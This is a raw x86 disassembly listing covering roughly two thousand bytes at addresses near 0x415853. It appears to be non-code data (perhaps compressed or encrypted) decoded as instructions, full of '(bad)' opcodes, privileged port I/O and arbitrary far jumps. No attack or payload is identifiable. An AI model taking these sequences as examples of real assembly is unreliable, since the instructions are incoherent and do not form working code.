  415853:	mov    edx,ebp
  415855:	dec    ebp
  415856:	inc    esp
  415857:	dec    ecx
  415858:	ret    
  415859:	call   0x1f2d:0xcf0dd0d0
  415860:	out    dx,al
  415861:	add    ebx,DWORD PTR [ebx+eax*4-0x47b39d7a]
  415868:	push   cs
  415869:	mov    edx,0x391eedd0
  41586e:	xchg   bh,ch
  415870:	mov    ah,0x89
  415872:	adc    DWORD PTR [eax],0xd
  415875:	cs pushf 
  415877:	ins    DWORD PTR es:[edi],dx
  415878:	sbb    cl,0xa2
  41587b:	sbb    ebx,esi
  41587d:	pop    ebp
  41587e:	xchg   esi,eax
  41587f:	and    eax,0xbab22aa0
  415884:	out    dx,eax
  415885:	in     al,0x54
  415887:	imul   BYTE PTR [ecx+0x58]
  41588a:	pop    ss
  41588b:	rcl    DWORD PTR [edx-0x1f2985d3],cl
  415891:	nop
  415892:	jle    0x415896
  415894:	jmp    0x2fd6:0x64a5a22d
  41589b:	mov    eax,ds:0x519983fe
  4158a0:	pop    ds
  4158a1:	jg     0x4158fd
  4158a3:	(bad)  
  4158a4:	sahf   
  4158a5:	sub    DWORD PTR [ebx+0x43],ebx
  4158a8:	sub    DWORD PTR [esi-0x1f1dd2ce],0xffffff92
  4158af:	mov    dh,0x37
  4158b1:	xchg   esp,eax
  4158b2:	xchg   ebp,eax
  4158b3:	cmp    esi,DWORD PTR [ebx+eiz*1-0x79985cfd]
  4158ba:	jge    0x4158b2
  4158bc:	(bad)
  4158c0:	(bad)  
  4158c1:	es ja  0x415902
  4158c4:	ret    
  4158c5:	lds    esi,FWORD PTR [eax-0x5ef3fdd]
  4158cb:	push   esp
  4158cc:	ret    0xacce
  4158cf:	jnp    0x41591f
  4158d1:	jmp    0x3f49b518
  4158d6:	imul   edi,DWORD PTR [ecx],0xe2e823ca
  4158dc:	inc    ebx
  4158dd:	xor    DWORD PTR [edi+0x69c51c7b],eax
  4158e3:	fsub   DWORD PTR [edi]
  4158e5:	xchg   ebp,eax
  4158e6:	imul   eax,DWORD PTR [edx],0xde18ef80
  4158ec:	mov    ds:0x39230b06,eax
  4158f1:	mul    DWORD PTR [ebp-0x2]
  4158f4:	lahf   
  4158f5:	mov    ds:0x5eb85237,eax
  4158fa:	xchg   ebx,eax
  4158fb:	in     al,0xa9
  4158fd:	lods   eax,DWORD PTR ds:[esi]
  4158fe:	adc    al,0xc1
  415900:	into   
  415901:	inc    esi
  415902:	or     DWORD PTR [ecx+0x62c82d69],0x98283ca5
  41590c:	cmp    dl,cl
  41590e:	lahf   
  41590f:	add    BYTE PTR [esi-0x23],0xa6
  415913:	(bad)  
  415914:	stos   DWORD PTR es:[edi],eax
  415915:	adc    DWORD PTR ds:0x719c9ee0,esp
  41591b:	add    ch,BYTE PTR [ebp+0x8e00285]
  415921:	dec    edx
  415922:	push   esp
  415923:	(bad)  
  415924:	sbb    DWORD PTR fs:[edi],eax
  415927:	(bad)  
  415928:	jne    0x41598b
  41592a:	fwait
  41592b:	out    0x1b,eax
  41592d:	enter  0x8dd2,0x29
  415931:	jb     0x415996
  415933:	and    ch,al
  415935:	add    esi,ebx
  415937:	lock jb 0x415937
  41593a:	xchg   BYTE PTR [eax],bl
  41593c:	cmp    ebp,DWORD PTR [esi]
  41593e:	shl    ebx,0x40
  415941:	ret    0x62fe
  415944:	loop   0x415957
  415946:	dec    esp
  415947:	push   eax
  415948:	cmp    al,0xc8
  41594a:	jbe    0x4158db
  41594c:	call   0xbd51:0x4970dbf8
  415953:	shl    BYTE PTR [ecx+0x7e],cl
  415956:	jns    0x4159a0
  415958:	cmc    
  415959:	pop    ds
  41595a:	or     DWORD PTR [edx-0x21],0x8e31785b
  415961:	sahf   
  415962:	dec    eax
  415963:	(bad)  
  415964:	loopne 0x415954
  415966:	sub    al,BYTE PTR [ecx+esi*8+0x4eb3716a]
  41596d:	out    dx,eax
  41596e:	test   al,0x7f
  415970:	aaa    
  415971:	mov    edi,0xfe441b65
  415976:	adc    DWORD PTR [ebx],edx
  415978:	aas    
  415979:	mov    esp,0x30911bf5
  41597e:	stos   DWORD PTR es:[edi],eax
  41597f:	xchg   edi,eax
  415980:	push   0xfffffff7
  415982:	xor    ecx,esi
  415984:	jo     0x415990
  415986:	and    DWORD PTR [esi],ebx
  415988:	inc    edx
  415989:	lea    edi,[esi]
  41598b:	lahf   
  41598c:	loop   0x415992
  41598e:	dec    esp
  41598f:	int3   
  415990:	(bad)  
  415991:	into   
  415992:	sti    
  415993:	sub    BYTE PTR [esi],bl
  415995:	mov    dl,0x4a
  415997:	icebp  
  415998:	adc    ebx,DWORD PTR ss:[eax-0x7fdc8f2a]
  41599f:	lods   eax,DWORD PTR ds:[esi]
  4159a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159a1:	push   ebx
  4159a2:	xchg   ebx,eax
  4159a3:	cdq    
  4159a4:	fadd   DWORD PTR [edx+0x21c7912f]
  4159aa:	cmc    
  4159ab:	mov    al,0x89
  4159ad:	outs   dx,DWORD PTR ds:[esi]
  4159ae:	mov    DWORD PTR [eax-0x7d4d4326],edi
  4159b4:	mov    eax,0xb99cfaa9
  4159b9:	inc    ebx
  4159ba:	jecxz  0x4159eb
  4159bc:	push   eax
  4159bd:	cdq    
  4159be:	int    0x57
  4159c0:	sub    ah,dl
  4159c2:	or     BYTE PTR [esi],al
  4159c4:	repnz xor DWORD PTR [ebx],edx
  4159c7:	fs jno 0x4159f7
  4159ca:	out    dx,al
  4159cb:	or     cl,BYTE PTR [esi+eax*2+0x59]
  4159cf:	sub    eax,0x22a9f966
  4159d4:	sub    BYTE PTR ds:0x72954bd0,bl
  4159da:	dec    ecx
  4159db:	shl    BYTE PTR [eax],0xa1
  4159de:	mov    eax,0x2796ee65
  4159e3:	test   bl,dh
  4159e5:	loopne 0x415a64
  4159e7:	xchg   ebx,eax
  4159e8:	cmp    al,0xd7
  4159ea:	retf   0xf06d
  4159ed:	mov    esi,0x898ce5cf
  4159f2:	cmp    al,0x19
  4159f4:	call   0xf3a4:0xc86bc137
  4159fb:	pop    edi
  4159fc:	pop    eax
  4159fd:	jp     0x415a52
  4159ff:	sub    BYTE PTR [ecx-0x4089c36b],ch
  415a05:	sar    DWORD PTR [ecx+ebx*8+0x6faf08e6],cl
  415a0c:	rcl    DWORD PTR [ecx-0x59983912],0xca
  415a13:	ds or  cl,dh
  415a16:	iret   
  415a17:	or     ecx,DWORD PTR [ebx-0x2cc835f9]
  415a1d:	jp     0x415a50
  415a1f:	dec    esi
  415a20:	cwde   
  415a21:	jmp    0xd2fa:0xa055143f
  415a28:	(bad)  
  415a29:	mov    bl,0xfb
  415a2b:	adc    DWORD PTR [edi+0x1f],eax
  415a2e:	pop    es
  415a2f:	add    al,0xcd
  415a31:	repz scas al,BYTE PTR es:[edi]
  415a33:	jb     0x415a42
  415a35:	cmp    eax,0x721ab534
  415a3b:	int    0x5a
  415a3d:	ss jo  0x4159d2
  415a40:	ficom  WORD PTR [edx+eax*8-0x44]
  415a44:	fiadd  WORD PTR [edi]
  415a46:	pop    es
  415a47:	xlat   BYTE PTR ds:[ebx]
  415a48:	neg    BYTE PTR [edx]
  415a4a:	(bad)  
  415a4b:	cmp    eax,DWORD PTR [edi+0x1c]
  415a4e:	pop    eax
  415a4f:	int    0xda
  415a51:	jmp    0x415a60
  415a53:	mov    al,0x7e
  415a55:	jecxz  0x415a80
  415a57:	xchg   esp,eax
  415a58:	out    0x5d,al
  415a5a:	nop
  415a5b:	push   ss
  415a5c:	xor    eax,0xd40fb747
  415a61:	call   0x7cb7b424
  415a66:	push   esi
  415a67:	sbb    eax,0x87681fbb
  415a6c:	in     eax,dx
  415a6d:	push   ebx
  415a6e:	fisub  WORD PTR [edi+0x62]
  415a71:	cmp    al,BYTE PTR [esi-0x32]
  415a74:	sub    al,0x2c
  415a76:	cs repnz lahf 
  415a79:	add    BYTE PTR [esi],bl
  415a7b:	in     eax,0x6f
  415a7d:	xor    BYTE PTR [ecx+0x13],ah
  415a80:	lds    edx,FWORD PTR [edi-0x13]
  415a83:	popa   
  415a84:	fwait
  415a85:	push   ds
  415a86:	(bad)  
  415a87:	popa   
  415a88:	mov    eax,0x8dd133ae
  415a8d:	test   BYTE PTR [edx],al
  415a8f:	pushf  
  415a90:	jb     0x415ac4
  415a92:	add    cl,ch
  415a94:	fild   WORD PTR [edx]
  415a96:	add    BYTE PTR [eax],al
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	enter  0xf2f3,0x1
  415aa8:	mov    eax,0xb9707f0d
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415a55
  415ab1:	mov    ebx,0xbed0c67
  415ab6:	pop    edx
  415ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ab8:	shr    DWORD PTR [esi+0x7b],cl
  415abb:	inc    esp
  415abc:	inc    esi
  415abd:	pop    ebx
  415abe:	push   ecx
  415abf:	or     dl,BYTE PTR [eax]
  415ac1:	pop    ecx
  415ac2:	push   eax
  415ac3:	cdq    
  415ac4:	xchg   ebp,eax
  415ac5:	push   ebx
  415ac6:	nop
  415ac7:	jo     0x415a92
  415ac9:	imul   ecx,DWORD PTR [eax+eax*1],0xb
  415acd:	sub    DWORD PTR [ebp+0x3a32ed8d],esp
  415ad3:	test   al,0xf3
  415ad5:	cmp    BYTE PTR ds:0x15f03466,cl
  415adb:	ins    BYTE PTR es:[edi],dx
  415adc:	enter  0xab0a,0xe6
  415ae0:	xchg   ebx,eax
  415ae1:	sti    
  415ae2:	stc    
  415ae3:	push   ds
  415ae4:	cs ret 
  415ae6:	mov    dl,0xe3
  415ae8:	push   ss
  415ae9:	std    
  415aea:	ds ror edx,1
  415aed:	sub    edx,DWORD PTR [edx]
  415aef:	(bad)  
  415af0:	or     dl,dl
  415af2:	fistp  DWORD PTR [ebx]
  415af4:	dec    esp
  415af5:	rcr    dh,0xd
  415af8:	add    bl,al
  415afa:	dec    eax
  415afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415afc:	add    ah,bh
  415afe:	sbb    eax,0xfeb1d8e9
  415b03:	mov    eax,0x8e224fc7
  415b08:	push   DWORD PTR [ebp+0x4d2a4530]
  415b0e:	js     0x415ad4
  415b10:	xadd   DWORD PTR [edx+ecx*8],ebx
  415b14:	aam    0xfe
  415b16:	jb     0x415ac6
  415b18:	jle    0x415b31
  415b1a:	jb     0x415aeb
  415b1c:	cwde   
  415b1d:	ins    DWORD PTR es:[edi],dx
  415b1e:	mov    ds:0xeb8846a3,al
  415b23:	dec    eax
  415b24:	xor    al,0xf7
  415b26:	fldz   
  415b28:	(bad)  
  415b2a:	out    dx,eax
  415b2b:	loop   0x415b3a
  415b2d:	loope  0x415b85
  415b2f:	jnp    0x415ae9
  415b31:	test   BYTE PTR [edi],al
  415b33:	into   
  415b34:	cmc    
  415b35:	in     al,dx
  415b36:	jge    0x415ab8
  415b38:	cmp    al,0xea
  415b3a:	fsubr  DWORD PTR [edx]
  415b3c:	fdiv   st,st(2)
  415b3e:	and    BYTE PTR [edx],ah
  415b40:	ds mov ebx,0xd710cd87
  415b46:	imul   ebx,DWORD PTR [esp+ebx*8],0x78edb68
  415b4d:	xchg   DWORD PTR [ecx],esp
  415b4f:	in     al,0x9e
  415b51:	rol    BYTE PTR [edx+0x3d],cl
  415b54:	jnp    0x415b09
  415b56:	aaa    
  415b57:	jo     0x415bd7
  415b59:	xchg   esi,eax
  415b5a:	mov    dl,0x6c
  415b5c:	aaa    
  415b5d:	nop
  415b5e:	jo     0x415bd1
  415b60:	out    dx,eax
  415b61:	lods   al,BYTE PTR ds:[esi]
  415b62:	cld    
  415b63:	adc    al,0x4e
  415b65:	jge    0x415bde
  415b67:	xor    al,0xe
  415b69:	lods   al,BYTE PTR ds:[esi]
  415b6a:	pop    esi
  415b6b:	scas   al,BYTE PTR es:[edi]
  415b6c:	(bad)  
  415b6d:	sbb    ebp,DWORD PTR ds:0x6c6ac9ac
  415b73:	lods   eax,DWORD PTR ds:[esi]
  415b74:	jbe    0x415baf
  415b76:	repnz mov esi,DWORD PTR [edi+0x658f52a0]
  415b7d:	imul   eax,DWORD PTR [ecx+0x7c],0xd14667bc
  415b84:	stc    
  415b85:	inc    ebp
  415b86:	scas   al,BYTE PTR es:[edi]
  415b87:	loop   0x415b24
  415b89:	pop    edi
  415b8a:	stos   BYTE PTR es:[edi],al
  415b8b:	mov    al,ds:0xdc8b28f5
  415b90:	push   ss
  415b91:	shr    bl,1
  415b93:	mov    esi,0x9df3ad74
  415b98:	mov    ah,0x80
  415b9a:	adc    bl,BYTE PTR [edi]
  415b9c:	int    0x99
  415b9e:	or     ch,ch
  415ba0:	mov    al,ds:0x63eba6f7
  415ba5:	cmp    BYTE PTR [esi+0x7ffcbb4a],0xcf
  415bac:	xchg   esi,eax
  415bad:	jmp    0x415b9c
  415baf:	inc    esi
  415bb0:	and    esi,esp
  415bb2:	(bad)  
  415bb3:	and    eax,0xa9937319
  415bb8:	(bad)
  415bbc:	inc    dl
  415bbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bbf:	retf   0x1644
  415bc2:	cmp    BYTE PTR [ebx+esi*2+0x4cc6462f],al
  415bc9:	std    
  415bca:	mov    ds:0xf92c34b6,eax
  415bcf:	lea    ebx,[edx+0xfe4ffc9]
  415bd5:	pop    esi
  415bd6:	mov    eax,DWORD PTR [esi-0x7782d239]
  415bdc:	jns    0x415bb6
  415bde:	add    BYTE PTR [eax],al
  415be0:	jno    0x415c48
  415be2:	aaa    
  415be3:	test   DWORD PTR [edi],ebp
  415be5:	xchg   esi,eax
  415be6:	call   0xb4884392
  415beb:	jmp    DWORD PTR [ecx]
  415bed:	cmp    eax,0x2f901f3e
  415bf2:	jp     0x415c37
  415bf4:	mov    ds:0x89f7f905,eax
  415bf9:	jmp    0xc1b0:0xb78393a8
  415c00:	pushf  
  415c01:	out    0x9f,al
  415c03:	loopne 0x415be0
  415c05:	test   al,0x7e
  415c07:	sti    
  415c08:	jbe    0x415bf6
  415c0a:	shl    BYTE PTR [ebx-0x75d9b5dc],0xa5
  415c11:	lods   al,BYTE PTR ds:[esi]
  415c12:	scas   al,BYTE PTR es:[edi]
  415c13:	sti    
  415c14:	xchg   esi,eax
  415c15:	push   ebp
  415c16:	mov    ebp,ss
  415c18:	cmp    eax,0x35b1f91f
  415c1d:	push   cs
  415c1e:	jl     0x415bea
  415c20:	xchg   ecx,eax
  415c21:	cmp    ch,BYTE PTR [esi]
  415c23:	out    dx,al
  415c24:	ja     0x415bec
  415c26:	pop    es
  415c27:	leave  
  415c28:	cmp    DWORD PTR [esi+eiz*2],edx
  415c2b:	inc    eax
  415c2c:	jns    0x415c44
  415c2e:	fst    st(6)
  415c30:	dec    esp
  415c31:	test   BYTE PTR [edi+eiz*8+0x22e9ee61],cl
  415c38:	ss retf 0x2649
  415c3c:	jns    0x415c60
  415c3e:	mov    ch,0xc9
  415c40:	push   ds
  415c41:	inc    edx
  415c42:	mov    cl,0x26
  415c44:	mov    ebp,0x7141a2cd
  415c49:	xor    al,0xc2
  415c4b:	pop    es
  415c4c:	add    eax,0x884c4cf8
  415c51:	stos   BYTE PTR es:[edi],al
  415c52:	fwait
  415c53:	dec    ebp
  415c54:	xor    ecx,edx
  415c56:	shr    BYTE PTR [edi+0x1],cl
  415c59:	ficom  WORD PTR gs:[esi]
  415c5c:	xchg   DWORD PTR [edx],edx
  415c5e:	push   esp
  415c5f:	mov    gs,esi
  415c61:	scas   eax,DWORD PTR es:[edi]
  415c62:	aas    
  415c63:	in     al,dx
  415c64:	fadd   QWORD PTR [esi-0x28]
  415c67:	shr    DWORD PTR [edx],1
  415c69:	sahf   
  415c6a:	ja     0x415cc1
  415c6c:	jmp    DWORD PTR [eax+ebp*4]
  415c6f:	ins    BYTE PTR es:[edi],dx
  415c70:	nop
  415c71:	cwde   
  415c72:	cwde   
  415c73:	jle    0x415c0e
  415c75:	cmp    DWORD PTR [edx+0x3082b7a5],eax
  415c7b:	xchg   esp,eax
  415c7c:	sub    eax,0x7f048c96
  415c81:	rcr    edx,cl
  415c83:	jp     0x415c81
  415c85:	adc    BYTE PTR [ebx+0x72],cl
  415c88:	fadd   DWORD PTR [esi+0x612d28c0]
  415c8e:	int    0xdd
  415c90:	shr    BYTE PTR ds:0xae0d75c0,1
  415c96:	(bad)  
  415c97:	retf   0x49e2
  415c9a:	popf   
  415c9b:	in     eax,0x80
  415c9d:	dec    eax
  415c9e:	scas   al,BYTE PTR es:[edi]
  415c9f:	js     0x9e7b70d9
  415ca5:	and    eax,0x244f29df
  415caa:	sbb    ah,0x63
  415cad:	cmp    al,0xbb
  415caf:	inc    ebp
  415cb0:	mov    dh,0x4
  415cb2:	ds fwait
  415cb4:	jl     0x415c90
  415cb6:	frstor [ecx]
  415cb8:	pop    ss
  415cb9:	ins    DWORD PTR es:[edi],dx
  415cba:	inc    edi
  415cbb:	ror    BYTE PTR [ebp-0x73],1
  415cbe:	push   es
  415cbf:	mov    ecx,0xc101c77f
  415cc4:	jmp    0x4845:0x9aeaac18
  415ccb:	xchg   ebp,eax
  415ccc:	data16 loope 0x415c89
  415ccf:	inc    ebx
  415cd0:	and    al,0x47
  415cd2:	mov    ah,0xca
  415cd4:	xchg   esp,eax
  415cd5:	clc    
  415cd6:	pusha  
  415cd7:	xchg   ecx,eax
  415cd8:	jo     0x415c9a
  415cda:	push   ds
  415cdb:	mov    edi,0x8ad69c1c
  415ce0:	cs cdq 
  415ce2:	xchg   BYTE PTR [ebp*1+0x6d440c1d],ch
  415ce9:	cs jl  0x415d08
  415cec:	mov    ds:0x77306b57,al
  415cf1:	mov    ebx,0x63bcfc57
  415cf6:	je     0x415cb6
  415cf8:	hlt    
  415cf9:	outs   dx,DWORD PTR ds:[esi]
  415cfa:	std    
  415cfb:	dec    eax
  415cfc:	push   ss
  415cfd:	loopne 0x415d01
  415cff:	push   ss
  415d00:	pop    ss
  415d01:	xor    eax,0x36
  415d04:	(bad)  
  415d05:	mov    bh,0x11
  415d07:	repnz jmp 0x16b2:0xa352e0c5
  415d0f:	and    dh,bh
  415d11:	sbb    DWORD PTR [edx+0x6f],edi
  415d14:	inc    ecx
  415d15:	dec    edi
  415d16:	imul   esp,DWORD PTR [edi+0x84c6df3],0xa4654e4a
  415d20:	loope  0x415d05
  415d22:	(bad)  
  415d23:	in     eax,dx
  415d24:	repz add BYTE PTR [eax],dl
  415d27:	cmp    al,0xee
  415d29:	or     eax,0x224d26a9
  415d2e:	int    0xc3
  415d30:	xchg   edi,eax
  415d31:	ret    
  415d32:	mov    ch,0x49
  415d34:	rcr    DWORD PTR [eax-0x29],0x64
  415d38:	mov    ds:0xb9686955,eax
  415d3d:	(bad)  
  415d3e:	pop    edx
  415d3f:	jl     0x415d11
  415d41:	aad    0x99
  415d43:	aaa    
  415d44:	(bad)  
  415d45:	cli    
  415d46:	outs   dx,DWORD PTR ds:[esi]
  415d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d48:	ins    BYTE PTR es:[edi],dx
  415d49:	jmp    0x88a1de7f
  415d4e:	scas   al,BYTE PTR es:[edi]
  415d4f:	dec    ebx
  415d50:	push   0x26
  415d52:	sbb    DWORD PTR [eax-0x3],edx
  415d55:	aaa    
  415d56:	test   dl,ah
  415d58:	sub    BYTE PTR [ebp-0x23],bh
  415d5b:	add    ecx,esp
  415d5d:	(bad)
  415d60:	(bad)  
  415d61:	mov    esi,0x2e6cc004
  415d66:	dec    edi
  415d67:	loop   0x415d19
  415d69:	and    dl,BYTE PTR [ecx+0xf5dfc0]
  415d6f:	cmp    eax,0x2ac5a514
  415d74:	sub    BYTE PTR [edx-0x77],0x8b
  415d78:	push   ebp
  415d79:	or     BYTE PTR [ebx+0x489dc7d],cl
  415d7f:	xchg   edi,eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	cwde   
  415d95:	xchg   edi,eax
  415d96:	sub    DWORD PTR [ecx],esp
  415d98:	or     DWORD PTR [edx],0x7eb9707f
  415d9e:	jo     0x415e10
  415da0:	(bad)  
  415da1:	outs   dx,DWORD PTR ds:[esi]
  415da2:	mov    eax,ds:0x6b7374a0
  415da7:	xchg   ebx,eax
  415da8:	pop    ebx
  415da9:	retf   
  415daa:	retf   
  415dab:	sub    BYTE PTR [ebx-0x3f6eb4e4],ch
  415db1:	jl     0x415d6d
  415db3:	nop
  415db4:	cmp    al,0x81
  415db6:	mov    dh,0xfe
  415db8:	cmp    ecx,ebp
  415dba:	xor    ch,al
  415dbc:	gs add al,0x52
  415dbf:	jbe    0x415da1
  415dc1:	adc    DWORD PTR [ebp-0x1f],ebp
  415dc4:	add    dh,BYTE PTR [edx-0x63]
  415dc7:	pop    es
  415dc8:	aas    
  415dc9:	dec    esp
  415dca:	or     DWORD PTR [esp+edi*8],esp
  415dcd:	test   BYTE PTR [eax+eiz*2-0x12af3efa],cl
  415dd4:	popa   
  415dd5:	xor    BYTE PTR [ebp+edi*1-0x6d864cd6],dl
  415ddc:	xchg   esp,eax
  415ddd:	jl     0x415e42
  415ddf:	xor    eax,0xfcbb37a0
  415de4:	mov    bl,0x77
  415de6:	mov    WORD PTR [esi-0x2aa572ca],es
  415dec:	xchg   ecx,eax
  415ded:	inc    edx
  415dee:	repnz out 0xef,al
  415df1:	cld    
  415df2:	mov    edx,0xc60b15f8
  415df7:	mov    ebp,ebx
  415df9:	stc    
  415dfa:	std    
  415dfb:	loopne 0x415da7
  415dfd:	adc    BYTE PTR cs:[esi-0x7a7957b5],0x85
  415e05:	stos   DWORD PTR es:[edi],eax
  415e06:	addr16 js 0x415de1
  415e09:	stc    
  415e0a:	in     eax,0x7c
  415e0c:	pushf  
  415e0d:	push   edi
  415e0e:	xlat   BYTE PTR ds:[ebx]
  415e0f:	pusha  
  415e10:	das    
  415e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e12:	cmp    DWORD PTR [ebp+edx*2-0x6f],0xde0e402f
  415e1a:	dec    esp
  415e1b:	leave  
  415e1c:	and    eax,0xb9873626
  415e21:	addr16 pop ebx
  415e23:	in     eax,dx
  415e24:	stc    
  415e25:	fwait
  415e26:	(bad)  
  415e27:	pop    ebp
  415e28:	mov    bl,0x75
  415e2a:	xor    al,0xd6
  415e2c:	jmp    0x41cf:0xccf535e2
  415e33:	aaa    
  415e34:	jbe    0x415e2a
  415e36:	xchg   esp,eax
  415e37:	dec    ecx
  415e38:	adc    BYTE PTR [ebx],bl
  415e3a:	mov    WORD PTR [edx+ecx*1],ds
  415e3d:	adc    ah,BYTE PTR [ebx-0x1b]
  415e40:	clc    
  415e41:	dec    ebp
  415e42:	popf   
  415e43:	fs push ss
  415e45:	aas    
  415e46:	xchg   esp,eax
  415e47:	fstp   st(6)
  415e49:	ins    BYTE PTR es:[edi],dx
  415e4a:	ror    DWORD PTR [esi+ecx*4+0x6f],0xeb
  415e4f:	scas   al,BYTE PTR es:[edi]
  415e50:	mov    ebx,esi
  415e52:	pop    ecx
  415e53:	and    al,0x53
  415e55:	and    al,cl
  415e57:	dec    esi
  415e58:	inc    edx
  415e59:	mov    ah,cl
  415e5b:	or     al,0xc7
  415e5d:	push   eax
  415e5e:	jmp    0x944f:0x5fa0c580
  415e65:	fxch   st(1)
  415e67:	inc    ebp
  415e68:	xlat   BYTE PTR ds:[ebx]
  415e69:	jo     0x415e2b
  415e6b:	stos   BYTE PTR es:[edi],al
  415e6c:	pop    esp
  415e6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e6e:	(bad)  
  415e6f:	lea    ebx,[edx-0x12]
  415e72:	dec    edi
  415e73:	out    dx,al
  415e74:	xor    eax,0x51cfc031
  415e79:	inc    ebp
  415e7a:	je     0x415e5f
  415e7c:	pop    ecx
  415e7d:	sub    eax,0x260445e7
  415e82:	data16 aam 0x46
  415e85:	push   0x32
  415e87:	push   0x47
  415e89:	stos   DWORD PTR es:[edi],eax
  415e8a:	(bad)  
  415e8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e8c:	(bad)
  415e8f:	inc    ebp
  415e90:	xchg   edx,eax
  415e91:	pusha  
  415e92:	dec    ebp
  415e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e94:	add    edi,DWORD PTR [edi+0xcf027ff]
  415e9a:	add    eax,0xa17dac85
  415e9f:	repz imul ch
  415ea2:	jae    0x415f16
  415ea4:	imul   eax,DWORD PTR [edx+0x1c],0xffffffa0
  415ea8:	push   esi
  415ea9:	pushf  
  415eaa:	or     cl,BYTE PTR [ebx-0x2fb1db8f]
  415eb0:	jmp    0x415ef7
  415eb2:	jge    0x415e41
  415eb4:	or     ecx,DWORD PTR [eax+edi*1]
  415eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eb9:	leave  
  415eba:	adc    eax,0x91fa15aa
  415ebf:	pop    edx
  415ec0:	lods   al,BYTE PTR ds:[esi]
  415ec1:	mov    al,ds:0xdafc76d9
  415ec6:	sub    edi,esi
  415ec8:	xor    ah,bh
  415eca:	sub    al,0x66
  415ecc:	and    eax,0x5007edc3
  415ed1:	adc    BYTE PTR [eax+eax*2-0x38],ah
  415ed5:	xchg   ebx,eax
  415ed6:	leave  
  415ed7:	add    al,0x14
  415ed9:	(bad)  
  415eda:	addr16 aam 0xc6
  415edd:	aaa    
  415ede:	dec    eax
  415edf:	dec    ebp
  415ee0:	xor    al,0x7c
  415ee2:	mov    al,0xa3
  415ee4:	and    BYTE PTR [edi-0x2f8e2844],bh
  415eea:	pop    edx
  415eeb:	cld    
  415eec:	mov    edx,0xdcfefe56
  415ef1:	mov    esi,0xffb3b71b
  415ef6:	dec    eax
  415ef7:	test   bl,bh
  415ef9:	test   eax,0x7bb3432f
  415efe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eff:	shl    DWORD PTR [ebx+esi*1-0x6b1b19e3],0xe9
  415f07:	pop    DWORD PTR [edx]
  415f09:	es pop ecx
  415f0b:	pop    esi
  415f0c:	sti    
  415f0d:	call   0x1c06:0x1e3dd3b5
  415f14:	sti    
  415f15:	mov    ebx,0xbcf6700a
  415f1a:	cmc    
  415f1b:	push   ss
  415f1c:	cmp    edx,DWORD PTR [ebp+0x3781cbf9]
  415f22:	loop   0x415f24
  415f24:	xchg   ebx,eax
  415f25:	repz pushf 
  415f27:	fxch   st(6)
  415f29:	sbb    eax,0x4e0cfe6f
  415f2e:	sbb    DWORD PTR [ecx-0x73],0xfe7ab7c6
  415f35:	sub    edi,esi
  415f37:	xor    DWORD PTR [ebx+ecx*2+0x29],ecx
  415f3b:	push   ebx
  415f3c:	and    edx,ebx
  415f3e:	push   ebx
  415f3f:	mov    bh,0xba
  415f41:	mov    ebx,0xdd1e4b98
  415f46:	xchg   edi,eax
  415f47:	test   eax,0xff38e4d
  415f4d:	mov    al,BYTE PTR [ecx-0x17]
  415f50:	push   ebx
  415f51:	xor    al,0x3e
  415f53:	push   ecx
  415f54:	inc    ebp
  415f55:	stos   DWORD PTR es:[edi],eax
  415f56:	xlat   BYTE PTR ds:[ebx]
  415f57:	xchg   DWORD PTR [ecx],esi
  415f59:	bound  esp,QWORD PTR [ecx]
  415f5b:	mov    ah,0x74
  415f5d:	jo     0x415f68
  415f5f:	popf   
  415f60:	js     0x415fbd
  415f62:	add    bh,BYTE PTR [edi+0x35]
  415f65:	sbb    dl,bl
  415f67:	mov    ah,0x94
  415f69:	cdq    
  415f6a:	xor    BYTE PTR [ebp-0x36],dh
  415f6d:	xor    DWORD PTR [ebp-0x52],ebp
  415f70:	jmp    0x415fb8
  415f72:	outs   dx,BYTE PTR ds:[esi]
  415f73:	fsub   st,st(0)
  415f75:	ficom  DWORD PTR [ecx-0x42ace6c2]
  415f7b:	stc    
  415f7c:	pop    ebx
  415f7d:	(bad)  
  415f7e:	stos   DWORD PTR es:[edi],eax
  415f7f:	addr16 ss mov dh,0x6b
  415f83:	jo     0x415f70
  415f85:	jno    0x415fb5
  415f87:	cld    
  415f88:	dec    ebx
  415f89:	sar    DWORD PTR [eax],cl
  415f8b:	cwde   
  415f8c:	mov    al,ds:0xc26532c0
  415f91:	(bad)  
  415f92:	jge    0x415f4d
  415f94:	(bad)  
  415f95:	rol    DWORD PTR [edi],cl
  415f97:	jl     0x415fb3
  415f99:	and    cl,ch
  415f9b:	sti    
  415f9c:	cmp    eax,0xb81b25b
  415fa1:	fs out dx,al
  415fa3:	jbe    0x415f88
  415fa5:	lea    edx,[edi]
  415fa7:	lahf   
  415fa8:	sub    edx,DWORD PTR [ebp-0x553073f0]
  415fae:	or     DWORD PTR [ecx+0x6da148f4],ebx
  415fb4:	jo     0x415fa7
  415fb6:	scas   eax,DWORD PTR es:[edi]
  415fb7:	push   es
  415fb8:	ficom  WORD PTR [esi+0x23a6c7dd]
  415fbe:	add    al,BYTE PTR [ebx]
  415fc0:	pop    ds
  415fc1:	inc    ecx
  415fc2:	pop    edx
  415fc3:	(bad)  
  415fc4:	sbb    dh,BYTE PTR [edx]
  415fc6:	add    bl,dh
  415fc8:	bound  eax,QWORD PTR [edx-0x72]
  415fcb:	enter  0x7472,0x89
  415fcf:	out    dx,eax
  415fd0:	div    DWORD PTR [ebp-0x54]
